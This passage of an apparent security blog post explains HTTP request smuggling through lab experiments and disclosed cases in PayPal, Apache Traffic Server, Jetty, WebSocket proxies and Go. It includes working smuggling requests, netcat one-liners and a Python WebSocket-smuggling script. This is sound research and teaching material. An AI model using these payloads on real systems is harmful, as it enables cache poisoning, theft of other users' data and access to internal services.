<a href=/2019/12/08/HTTP-Smuggling-en/20200520131794.png data-size=1692x372><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520131794.png width=1692 height=372 srcset="/2019/12/08/HTTP-Smuggling-en/20200520131794_huce671dbf3d5c29e12c03050423134d18_78923_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520131794_huce671dbf3d5c29e12c03050423134d18_78923_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>We can <code>alert(1)</code> !</p>
<p>The entire process can be understood using the following processes.</p>
<pre tabindex=0><code>Innocent        Attacker          Front           Backend
    |               |               |               |
    |               |--A(1A+1/2B)--&gt;|               | 
    |               |               |--A(1A+1/2B)--&gt;| 
    |               |               |&lt;-A(200)-------|
    |               |               |            [1/2B]
    |               |&lt;-A(200)-------|            [1/2B]
    |               |--C-----------&gt;|            [1/2B]
    |               |               |--C-----------&gt;| * ending B *
    |               |            [*CP*]&lt;--B(200)----|
    |               |&lt;--B(200)------|               |
    |--C---------------------------&gt;|               |
    |&lt;--B(200)--------------------[HIT]             |
</code></pre><ul>
<li>1A + 1/2B means request A + an incomplete query B</li>
<li>A(X) : means X query is hidden in body of query A</li>
<li>CP : Cache poisoning</li>
</ul>
<p>Similar to the previous flowchart, because <code>/resources/js/tracking.js</code> requested in C will be cached by Front as a static resource, and we use HTTP Smuggling to direct this request to our exploit server and return<code>alert(1)</code> to request C, and then this response packet will be cached by the Front server, so we have successfully poisoned.</p>
<h3 id=perform-web-cache-deception>Perform Web Cache Deception</h3>
<p>In fact, this scenario is similar to cache poisoning, but with a slight difference. According to more official statements, cache cheating and cache poisoning have the following differences.</p>
<blockquote>
<p>What is the difference between web cache poisoning and web cache deception?</p>
<p>- In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
- In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</p>
</blockquote>
<p>This we do not cooperate with Lab. Because the environment provided by Lab maybe not work correctly.</p>
<p>But we can do like this to understand easily. We send the following HTTP request.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>43</span>
<span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>

<span class=g>0
</span><span class=g>
</span><span class=g>GET /private/messages HTTP/1.1
</span><span class=g>Foo: X
</span></code></pre></div><p>The smuglling request will use <code>Foo: X</code> to hide the first line of the next request header sent, which is the line<code> GET /xxx HTTP/1.1</code>, and this request will be accessed with the user&rsquo;s cookie. Similar to a CSRF, the request becomes the following request header.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>GET</span> <span class=nn>/private/messages</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Foo</span><span class=o>:</span> <span class=l>XGET /static/some-image.png HTTP/1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>vulnerable-website.com</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span>
</code></pre></div><p>As long as we send more times, once the user accesses the static resource, it may be cached by the Front server, and we can get the information of the user <code>/private/messages</code>. There may be a lot of repeated packet sending here, because you need to construct a static resource cache, or you need some luck.</p>
<p>So far, the basic attack surface of HTTP Smuggling has been introduced.</p>
<h2 id=real-world>Real World</h2>
<h3 id=paypal>Paypal</h3>
<p>First of all, I have to talk about the Paypal vulnerability instance shared by the author of HTTP Smuggling on Black Hat this year.</p>
<p>The author first poisoned a js file for Paypal login through HTTP Smuggling.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
</span><span class=err>Host: c.paypal.com
</span><span class=err>Content-Length: 61 
</span><span class=err>Transfer-Encoding: chunked
</span><span class=err>
</span><span class=err>0
</span><span class=err>
</span><span class=err></span><span class=nf>GET</span> <span class=nn>/webstatic</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>skeletonscribe.net?</span>
<span class=n>X</span><span class=o>:</span> <span class=l>XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span>
<span class=n>Host</span><span class=o>:</span> <span class=l>c.paypal.com</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>

<span class=g>HTTP/1.1 302 Found
</span><span class=g>Location: http://skeletonscribe.net?, c.paypal.com/webstatic/ 
</span></code></pre></div><p>But the Paypal login page has a CSP rule <code>script-src</code> which block this redirect.</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg loading=lazy>
</a>
</figure></p>
<p>Later, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn&rsquo;t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read.</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg loading=lazy>
</a>
</figure></p>
<p>His colleague then discovered a page at paypal.com/us/gifts that didn&rsquo;t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.</p>
<p><figure>
<a href=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg loading=lazy>
</a>
</figure></p>
<p>Paypal&rsquo;s first fix was to modify the Akamai configuration to reject requests containing <code>Transfer-Encoding: chunked</code>. But the author bypassed it quikly by constructing a newline header.</p>
<pre tabindex=0><code>Transfer-Encoding:
 chunked
</code></pre><h3 id=ats>ATS</h3>
<blockquote>
<p>​ Apache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache server for the Apache Software Foundation.</p>
<p>There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with Apache Traffic Server (ATS). This affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3.</p>
<p>In NVD, we can find four patches for this vulnerability, so let&rsquo;s take a closer look.</p>
<p>CVE-2018-8004 Patch list:</p>
<p><a class=link href=https://github.com/apache/trafficserver/pull/3192 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3192</a></p>
<p><a class=link href=https://github.com/apache/trafficserver/pull/3201 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3201</a></p>
<p><a class=link href=https://github.com/apache/trafficserver/pull/3231 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3231</a></p>
<p><a class=link href=https://github.com/apache/trafficserver/pull/3251 target=_blank rel=noopener>https://github.com/apache/trafficserver/pull/3251</a></p>
<p>Note: Although the vulnerability notification describes the scope of the vulnerability to version 7.1.3, from the version of the patch archive on github, most of the vulnerabilities have been fixed in version 7.1.3.</p>
</blockquote>
<p>About the analysis and recurrence of these four patches, I think @mengchen has already written very detailed, I will not repeat to talk about them. It is recommended to read the original part <a class=link href=https://paper.seebug.org/1049/##4-http-smuggling-attack-examplecve-2018-8004 target=_blank rel=noopener>HTTP Smuggling Attack Example——CVE-2018-8004</a>.</p>
<p>Here we talk about the part that is not in the original text.</p>
<pre tabindex=0><code>														[dummy-host7.example.com]
                                        |
                                  +-[8080]-----+
                                  | 8007-&gt;8080 |
                                  |  ATS7      |
                                  |            |
                                  +-----+------+
                                        |
                                        |
                                  +--[80]----+
                                  | 8002-&gt;80 |
                                  |  Nginx   |
                                  |          |
                                  +----------+
</code></pre><p>We build the above scenario, and we can use the docker experimental environment I built. Here is <a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1 target=_blank rel=noopener>lab1</a></p>
<h4 id=request-splitting-using-huge-header>Request Splitting using Huge Header</h4>
<p>We can experiment by using a header of 65535 characters.For example, we can send a request which have got a header of 65535 characters to ATS 7 by using the following code.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;GET_/something.html?zorg2=5_HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host:_dummy-host7.example.com\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;X:_&#34;%65534s&#34;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span>tr <span class=s2>&#34; &#34;</span> <span class=s2>&#34;1&#34;</span><span class=se>\
</span><span class=se></span><span class=p>|</span>tr <span class=s2>&#34;_&#34;</span> <span class=s2>&#34; &#34;</span><span class=se>\
</span><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8007</span>
</code></pre></div><p>Nginx will directly return a 400 code error, but it is more interesting with ATS 7. We will get a 400 response and a 200 response from ATS 7.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>400</span> <span class=ne>Invalid HTTP Request</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 18:52:42 GMT</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>ATS/7.1.1</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-store</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html</span>
<span class=n>Content-Language</span><span class=o>:</span> <span class=l>en</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>220</span>

<span class=p>&lt;</span><span class=nt>HTML</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>HEAD</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>TITLE</span><span class=p>&gt;</span>Bad Request<span class=p>&lt;/</span><span class=nt>TITLE</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>HEAD</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>BODY</span> <span class=na>BGCOLOR</span><span class=o>=</span><span class=s>&#34;white&#34;</span> <span class=na>FGCOLOR</span><span class=o>=</span><span class=s>&#34;black&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>H1</span><span class=p>&gt;</span>Bad Request<span class=p>&lt;/</span><span class=nt>H1</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>HR</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>FONT</span> <span class=na>FACE</span><span class=o>=</span><span class=s>&#34;Helvetica,Arial&#34;</span><span class=p>&gt;&lt;</span><span class=nt>B</span><span class=p>&gt;</span>
Description: Could not process this request.
<span class=p>&lt;/</span><span class=nt>B</span><span class=p>&gt;&lt;/</span><span class=nt>FONT</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>HR</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>BODY</span><span class=p>&gt;</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>ATS/7.1.1</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 18:52:42 GMT</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>119</span>
<span class=n>Last-Modified</span><span class=o>:</span> <span class=l>Fri, 29 Nov 2019 05:37:09 GMT</span>
<span class=n>ETag</span><span class=o>:</span> <span class=l>&#34;5de0ae85-77&#34;</span>
<span class=n>X-Location-echo</span><span class=o>:</span> <span class=l>/index.html?replaced=0&amp;cache=8</span>
<span class=n>X-Default-VH</span><span class=o>:</span> <span class=l>0</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>public, max-age=300</span>
<span class=n>Accept-Ranges</span><span class=o>:</span> <span class=l>bytes</span>
<span class=n>Age</span><span class=o>:</span> <span class=l>0</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>

<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;&lt;</span><span class=nt>head</span><span class=p>&gt;&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Nginx default static page<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Hello World<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>It works!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><h3 id=jetty>Jetty</h3>
<p>Jetty has three CVEs related to HTTP Smuggling.</p>
<ul>
<li>
<p>CVE-2017-7656 HTTP/0.9 issue</p>
<blockquote>
<pre><code>	In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.
</code></pre>
</blockquote>
</li>
<li>
<p>CVE-2017-7657 Chunk size attribute truncation</p>
<blockquote>
<pre><code>	In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.
</code></pre>
</blockquote>
</li>
<li>
<p>CVE-2017-7658 Double Content-Length</p>
<blockquote>
<pre><code>	In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.
</code></pre>
</blockquote>
</li>
</ul>
<p>For CVE-2017-7658, we will not explore it anymore, because as mentioned before, we mainly talk about the other two more interesting places.</p>
<h4 id=http09>HTTP/0.9</h4>
<p>Environment can still use what I built <a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty target=_blank rel=noopener>jetty lab enviroment</a>. Then we send a standard HTTP / 0.9 request as follows.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;GET /?test=4564\r\n&#39;</span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8994</span>
</code></pre></div><p>We will get a 400 code response.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>400</span> <span class=ne>HTTP/0.9 not supported</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html;charset=iso-8859-1</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>65</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>Jetty(9.4.9.v20180320)</span>

<span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>Bad Message 400<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;&lt;</span><span class=nt>pre</span><span class=p>&gt;</span>reason: HTTP/0.9 not supported<span class=p>&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>
</code></pre></div><p>We add the version identifier.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;GET /?test=4564 HTTP/0.9\r\n\r\n&#39;</span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 <span class=m>8994</span>
</code></pre></div><p>Although this is a format that is not supported by HTTP/0.9, there are unexpected gains, with a 200 response.</p>
<pre tabindex=0><code>&lt;head&gt;
&lt;title&gt;Sample &quot;Hello, World&quot; Application&lt;/title&gt;
&lt;/head&gt;
&lt;body bgcolor=white&gt;

&lt;table border=&quot;0&quot;&gt;
&lt;tr&gt;
...
</code></pre><p>No headers, only body. This request was parsed by HTTP/0.9.</p>
<p>What&rsquo;s more interesting is that adding headers not supported by HTTP/0.9 will have unexpected results. Here we add a header that extracts the content of the response packet.</p>
<pre tabindex=0><code>printf 'GET /?test=4564 HTTP/0.9\r\n'\
'Range: bytes=36-42\r\n'\
'\r\n'\
|nc -q 1 127.0.0.1 8994

, World
</code></pre><p>We will find that the body content has been extracted by us. Combined with the HTTP Response Splitting in HTTP Version part mentioned above, we can perform various fancy attacks.</p>
<h4 id=chunk-size-attribute-truncation>Chunk size attribute truncation</h4>
<p>We send the request with the following code.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;POST /?test=4973 HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;100000000\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;POST /?test=4974 HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-Length: 5\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 8994<span class=p>|</span>grep <span class=s2>&#34;HTTP/1.1&#34;</span>
</code></pre></div><p>Then we can get two 200 responses. But according to the standard of the chunk, although the second part looks like a request, it should actually be counted in the chunk data. The problem is here. Jetty returned two requests. 100000000 is treated as 0, which is the chunk end part, so there are two reasons for the request.</p>
<p>We can try more.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>printf</span> <span class=s1>&#39;POST /?test=4975 HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-Type: application/x-www-form-urlencoded\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;1ff00000008\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;abcdefgh\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;POST /?test=4976 HTTP/1.1\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Content-Length: 5\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;Host: localhost\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span><span class=se></span><span class=p>|</span>nc -q <span class=m>1</span> 127.0.0.1 8994<span class=p>|</span>grep <span class=s2>&#34;HTTP/1.1&#34;</span>
</code></pre></div><p>Here we still get two 200 responses, that is, the first chunk size 1ff00000008 was truncated to 8 by jetty. The chunk data part only has <code>abcdefgh</code>, so two responses are returned.</p>
<p>Similar to Apache CVE-2015-3183, jetty will only take the last 8 bytes of chunk size:</p>
<pre tabindex=0><code>ffffffffffff00000000\r\n
            ^^^^^^^^
            00000000 =&gt; size 0

1ff00000008\r\n
   ^^^^^^^^
   00000008 =&gt; size 8
</code></pre><h3 id=websocket>Websocket</h3>
<p>In fact, this part can be used as a separate part, but I think this article is so long, so we just talk about a brief introduction. In Hackactivity 2019, @0ang3el proposed Websocket-related attack techniques [What&rsquo;s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs](Https://www.slideshare.net/0ang3el/whats-wrong-with-websocket- apis-unveiling-vulnerabilities-in-websocket-apis), what interests me is the part of Websocket Smuggling. The author disclosure the relevant description in <a class=link href=https://github.com/0ang3el/websocket-smuggle target=_blank rel=noopener>websocket-smuggle</a>.</p>
<p>What is this attack surface? To sum up for you, when the connection is established in the websocket, if the reverse proxy does not fully comply with the RFC 6445 standard, the Sec-WebSocket-Version version is not handled properly. The connection between the client and the back-end server TCP/TLS won&rsquo;t be closed, so it cause an attack that we could conduct a smuglling request.</p>
<p>Here we assume that the solr service exists on the internal network and cannot be accessed from the external network. If websocket smuggling exists, we can write the following code to access the solr service.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>socket</span> 

<span class=n>req1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1
</span><span class=s2>Host: ip:port
</span><span class=s2>Sec-WebSocket-Version: 1338
</span><span class=s2>Upgrade: websocket
</span><span class=s2>
</span><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=n>req2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;GET /solr/##/ HTTP/1.1
</span><span class=s2>Host: localhost:8983
</span><span class=s2>
</span><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>netloc</span><span class=p>):</span>
    <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>netloc</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>

    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)))</span>

    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req1</span><span class=p>)</span>
    <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>

    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>req2</span><span class=p>)</span>
    <span class=c1>## print req2</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4096</span><span class=p>)</span>
    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span> <span class=o>=</span> <span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>

    <span class=n>sock</span><span class=o>.</span><span class=n>shutdown</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SHUT_RDWR</span><span class=p>)</span>
    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
    <span class=n>main</span><span class=p>(</span><span class=s1>&#39;ip:port&#39;</span><span class=p>)</span>
</code></pre></div><h3 id=golang>Golang</h3>
<p>This is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test <a class=link href=https://caddyserver.com/v1/ target=_blank rel=noopener>caddy</a> , and took it to fuzz. Because I was lazy, I used the environment on the docker hub [caddy](https: //hub.docker. com/r/abiosoft/caddy).</p>
<p>So, here we are.</p>
<p><figure class=gallery-image style=flex-grow:318;flex-basis:765px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520139367.png data-size=1728x542><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520139367.png width=1728 height=542 srcset="/2019/12/08/HTTP-Smuggling-en/20200520139367_hud0c9f6f46052366238d8c334bde9ef11_133963_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520139367_hud0c9f6f46052366238d8c334bde9ef11_133963_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<p>I was very happy at the time, thinking that getting a CVE was so simple. Because it is smiliar with Netty CVE , It could also produce a parsing difference. Then I and the mentor carefully explored the reason for this, followed the code, and found that it may be the cause of a native library in Golang.</p>
<p>I was happy at the time, and quickly searched how to raise an issue with Golang. But then I carefully worked on it for a while. I found that this issue had been mentioned on September 27 <a class=link href=https://github.com/golang/go/issues/34540 target=_blank rel=noopener>net / http: invalid headers are normalized, allowing request smuggling</a>, Golang also fixed the issue in version 1.13.1.</p>
<p>It&rsquo;s unhappy to miss a CVE. : (</p>
<p>But at present(11/27) the caddy environment on dockerhub still has this problem, use it with caution!</p>
<h3 id=something-else>Something Else</h3>
<p>There are related vulnerabilities disclosed on hackerone. Here are a few articles.</p>
<p><a class=link href=https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d target=_blank rel=noopener>Write up of two HTTP Requests Smuggling</a></p>
<p><a class=link href=https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html target=_blank rel=noopener>HTTP Request Smuggling (CL.TE)</a></p>
<p><a class=link href=https://hackerone.com/reports/694604 target=_blank rel=noopener>HTTP Request Smuggling on vpn.lob.com</a></p>
<h2 id=defence>Defence</h2>
<blockquote>
